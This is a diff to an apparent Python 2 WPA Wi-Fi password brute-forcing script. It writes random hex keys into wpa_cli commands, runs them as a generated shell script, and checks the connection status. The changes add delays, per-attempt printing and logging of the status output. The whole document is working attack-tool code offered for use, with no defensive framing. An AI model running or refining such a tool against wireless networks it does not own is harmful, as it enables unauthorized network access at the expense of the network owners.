@@ -353,7 +353,7 @@ if '1' =="1" :
         
 
         def wpa() :
-            # 6 pass in min
+            # 8 pass in min
             shell = '1a2b3c0d9e8f4756'
             def id_generator(size=64, chars=shell):
                 return ''.join(random.choice(chars) for _ in range(size))
@@ -366,6 +366,7 @@ if '1' =="1" :
                 e = command3
                 f = command4
                 g = 'wpa_cli %s set_network 0 psk %s > /dev/null' %(iff, id_generator())
+                print G +'[*] try' + W + g[29:100]
                 fil.write(g + '\n')
                 h = 'wpa_cli %s select_network 0 > /dev/null' %(iff)
                 z = '''
@@ -375,28 +376,31 @@ if '1' =="1" :
                 fil2 = open('wpa.sh', 'w')
                 fil2.write(crack)
                 fil2.close
-                
                 time.sleep(0.5)
                 os.system('sh wpa.sh')
-                time.sleep(2)
+                time.sleep(4)
                 status = 'wpa_cli %s status' %(iff)
+                time.sleep(0.2)
                 pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
-                o= pro.communicate()    
+                o= pro.communicate()
+                fil.write(str(o)+'\n')
                 a1 =  o[0]
                 if a1[120:139] == 'wpa_state=COMPLETED' :
                     print G + ' Connect ' + W
-                    print g
+                    print g[29:100]
                     exit()
                 
                 g = 'wpa_cli %s set_network 0 psk %s > /dev/null' %(iff, id_generator())
                 print G +'[*] try' + W + g[29:100]
+                fil.write(g + '\n')
                 crack = (aa + z + b + z + c + z + d + z + e + z + e + z + f + z + g + z + h + z  )
                 fil2 = open('wpa.sh', 'w')
                 fil2.write(crack)
                 fil2.close
                 time.sleep(0.5)
                 os.system('sh wpa.sh')
-                time.sleep(2)
+                time.sleep(4)
+                time.sleep(0.5)
                 pro= subprocess.Popen(status, stdout=subprocess.PIPE, stderr=None, shell=True)
                 o= pro.communicate()
                 fil.write(str(o)+'\n')
